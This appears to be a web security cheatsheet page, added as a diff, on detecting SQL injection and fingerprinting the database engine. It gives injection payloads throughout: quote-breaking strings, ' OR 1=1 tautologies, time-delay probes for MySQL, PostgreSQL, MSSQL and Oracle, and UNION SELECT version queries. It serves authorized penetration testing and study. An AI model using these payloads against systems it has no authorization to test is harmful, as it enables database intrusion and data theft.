@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SQLi Detection · ArxOS cheatsheets</title><link rel="stylesheet" href="../../../../codex.css"></head>
+<body><header class="cx-top"><a class="cx-brand" href="../../../../index.html">ArxOS</a><span class="cx-sub">Cheatsheets</span>
+<a class="cx-search-link" href="../../../../index.html#search">Search</a></header>
+<main class="cx-main"><nav class="cx-crumbs"><a href="../../../../index.html">Cheatsheets</a> › Web › SQL Injection</nav><h1>SQLi Detection</h1><p class="cx-lede">Identifying SQL injection points and fingerprinting the underlying DBMS.</p><div class="cx-tags"><span class="cx-tag">MITRE T1190</span><span class="cx-tag">D3FEND D3-MA, D3-NTA</span><span class="cx-tag">IMPACT DataExfil</span><span class="cx-tag">OWASP A05</span></div><article class="cx-body"><p>Detection is finding <em>any</em> injection - not yet exploiting it. Goal: confirm the parameter is injectable and identify the DBMS.</p>
+<h2 id="tldr">TL;DR</h2>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27;
+&quot;
+`
+)
+&#x27;)
+&quot;))
+\
+\\
+&#x27;;
+&#x27;&quot;
+&#x27;-- -
+&quot; -- -
+&#x27; OR 1=1-- -
+1&#x27; AND SLEEP(5)-- -</code></pre></figure>
+<p>Inject one at a time. Look for: SQL error messages, HTTP 500, response size change, response time delay, or behavioural change (login succeeds, content appears/disappears).</p>
+<h2 id="where-to-inject">Where to inject</h2>
+<p>Every value the application sends to the backend is a candidate:</p>
+<table>
+<thead>
+<tr>
+<th>Location</th>
+<th>How to test</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>URL query parameters</td>
+<td>Modify in browser or proxy</td>
+</tr>
+<tr>
+<td>POST body fields</td>
+<td>Modify in proxy</td>
+</tr>
+<tr>
+<td>JSON fields</td>
+<td>Inject inside string values: <code>"id":"1'"</code></td>
+</tr>
+<tr>
+<td>HTTP headers</td>
+<td><code>User-Agent</code>, <code>Cookie</code>, <code>Referer</code>, <code>X-Forwarded-For</code></td>
+</tr>
+<tr>
+<td>Cookies</td>
+<td>Often reflected into session-tracking queries</td>
+</tr>
+<tr>
+<td>Hidden form fields</td>
+<td>Visible in HTML source</td>
+</tr>
+</tbody>
+</table>
+<div class="cx-aside cx-tip">
+<p class="cx-aside-title">Tip</p>
+<p>Headers and cookies are commonly missed and frequently vulnerable. Always fuzz these in addition to obvious parameters.</p>
+</div>
+<h2 id="step-1-break-the-syntax">Step 1 - Break the syntax</h2>
+<p>Inject characters that would terminate a string literal, identifier, or expression:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27;        single quote
+&quot;        double quote
+`        backtick (MySQL identifier)
+)        closing paren
+&#x27;))      multiple terminators
+\        backslash escape test</code></pre></figure>
+<p><strong>Success indicator:</strong> SQL error returned, HTTP 500, or any visible deviation from the normal response. A returned error like <code>unclosed quotation mark</code>, <code>near "'": syntax error</code>, <code>ORA-</code>, <code>PG::SyntaxError</code> confirms injection AND fingerprints the DBMS.</p>
+<h2 id="step-2-confirm-with-balanced-payloads">Step 2 - Confirm with balanced payloads</h2>
+<p>If a single quote breaks the page, an even number of quotes should restore it:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>&#x27;&#x27;       two quotes - query works again
+&#x27;+&#x27;      string concatenation in some DBMS
+&#x27;||&#x27;     string concatenation in Oracle/PostgreSQL</code></pre></figure>
+<p>If the page works with <code>''</code> but breaks with <code>'</code>, you have injection.</p>
+<h2 id="step-3-confirm-with-logic">Step 3 - Confirm with logic</h2>
+<p>Submit semantically equivalent payloads. The page should respond identically:</p>
+<figure class="cx-code"><figcaption></figcaption><pre><code>1               baseline
+1 AND 1=1       still true → same response
+1 AND 1=2       false → different response (or empty)
+1&#x27; AND &#x27;1&#x27;=&#x27;1
+1&#x27; AND &#x27;1&#x27;=&#x27;2</code></pre></figure>
+<p>Different responses to logically true vs. false payloads = confirmed boolean-inferable injection. See <a href="../blind-boolean/index.html">Boolean-based blind</a>.</p>
+<h2 id="step-4-confirm-with-timing">Step 4 - Confirm with timing</h2>
+<p>When errors are suppressed and content doesn't change, force a measurable delay:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / MariaDB</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">1&#x27; AND SLEEP(5)-- -
+1&#x27; AND IF(1=1, SLEEP(5), 0)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">1&#x27;; SELECT pg_sleep(5)-- -
+1&#x27; || pg_sleep(5)-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">1&#x27;; WAITFOR DELAY &#x27;0:0:5&#x27;-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">1&#x27; || dbms_pipe.receive_message((&#x27;a&#x27;),5)-- -</code></pre></figure>
+</div>
+</div>
+<p><strong>Success indicator:</strong> response takes ~5 seconds longer than baseline. Repeat 2–3 times to rule out network jitter.</p>
+<h2 id="fingerprinting-the-dbms">Fingerprinting the DBMS</h2>
+<p>Once you have any working injection, identify the engine:</p>
+<div class="cx-tabs">
+<div class="cx-tab">
+<p class="cx-tab-label">MySQL / MariaDB</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT @@version-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">PostgreSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT version()-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">MSSQL</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT @@version-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">Oracle</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT banner FROM v$version-- -</code></pre></figure>
+</div>
+<div class="cx-tab">
+<p class="cx-tab-label">SQLite</p>
+<figure class="cx-code"><figcaption>sql</figcaption><pre><code class="language-sql">&#x27; UNION SELECT sqlite_version()-- -</code></pre></figure>
+</div>
+</div>
+<p>When the injection reflects into a <strong>numeric-only</strong> context (a string like <code>@@version</code> won't render, or breaks the query), fingerprint with a function that returns a number. A commonly taught fingerprint is <code>SELECT POW(1,1)</code> → <code>1</code>, but <code>POW</code> alone isn't conclusive: PostgreSQL exposes it as an undocumented alias for <code>POWER</code>, and SQLite accepts it when math functions are enabled, so a <code>1</code> coming back doesn't rule those out. A more specific numeric tell is MySQL/MariaDB-only <code>SELECT CONNECTION_ID()</code> (returns the numeric session id; errors on PostgreSQL/MSSQL/Oracle/SQLite). Pair either with the behavioural tests below to confirm.</p>
+<p>Behavioural fingerprinting (no UNION needed):</p>
+<table>
+<thead>
+<tr>
+<th>Test</th>
+<th>True for</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>SELECT @@version</code> works</td>
+<td>MySQL, MariaDB, MSSQL</td>
+</tr>
+<tr>
+<td><code>SELECT version()</code> works</td>
+<td>PostgreSQL, MySQL</td>
+</tr>
+<tr>
+<td><code>SELECT FROM dual</code> required</td>
+<td>Oracle</td>
+</tr>
+<tr>
+<td><code>SELECT TOP 1</code> works</td>
+<td>MSSQL</td>
+</tr>
+<tr>
+<td><code>LIMIT 1</code> works</td>
+<td>MySQL, PostgreSQL, SQLite</td>
+</tr>
+<tr>
+<td><code>ROWNUM &lt;= 1</code> works</td>
+<td>Oracle</td>
+</tr>
+<tr>
+<td>Stacked queries (<code>;</code>) work</td>
+<td>MSSQL, PostgreSQL (rarely MySQL)</td>
+</tr>
+<tr>
+<td><code>\|\|</code> is string concat</td>
+<td>Oracle, PostgreSQL, SQLite</td>
+</tr>
+<tr>
+<td><code>+</code> is string concat</td>
+<td>MSSQL</td>
+</tr>
+<tr>
+<td><code>CONCAT()</code> is string concat</td>
+<td>MySQL</td>
+</tr>
+</tbody>
+</table>
+<p>See <a href="../dbms-cheatsheet/index.html">DBMS cheatsheet</a> for full per-engine syntax.</p>
+<h2 id="what-to-do-next">What to do next</h2>
+<table>
+<thead>
+<tr>
+<th>Detection result</th>
+<th>Next page</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Login form behaves oddly</td>
+<td><a href="../auth-bypass/index.html">Authentication bypass</a></td>
+</tr>
+<tr>
+<td>Errors visible in response</td>
+<td><a href="../union-based/index.html">UNION-based</a></td>
+</tr>
+<tr>
+<td>Page changes on true/false</td>
+<td><a href="../blind-boolean/index.html">Boolean blind</a></td>
+</tr>
+<tr>
+<td>Only a condition-triggered error changes the response</td>
+<td><a href="../blind-error/index.html">Error-based blind</a></td>
+</tr>
+<tr>
+<td>Page only changes on time</td>
+<td><a href="../blind-time/index.html">Time blind</a></td>
+</tr>
+<tr>
+<td>Nothing visible at all</td>
+<td><a href="../out-of-band/index.html">Out-of-band</a></td>
+</tr>
+</tbody>
+</table>
+<h2 id="notes">Notes</h2>
+<div class="cx-aside cx-caution">
+<p class="cx-aside-title">Caution</p>
+<p>Front-end input validation does not count as protection. Send your payloads via a proxy (Burp, Caido) directly to the backend.</p>
+</div>
+<ul>
+<li>Some apps URL-encode user input before sending; others double-encode. If a payload doesn't fire, try sending it URL-encoded and double-encoded.</li>
+<li>A single <code>'</code> returning HTTP 200 with normal content does <em>not</em> mean the parameter is safe. Many injections only manifest with logical conditions or on specific code paths.</li>
+</ul></article><nav class="cx-pager"><a class="cx-prev" href="../sqlmap/index.html">Previous: SQLMap</a><a class="cx-next" href="../auth-bypass/index.html">Next: SQLi Authentication Bypass</a></nav></main>
+<footer class="cx-foot"><p>For authorized testing and study only. <a href="../../../../license.html">License</a></p></footer>
+<script src="../../../../codex.js"></script></body></html>
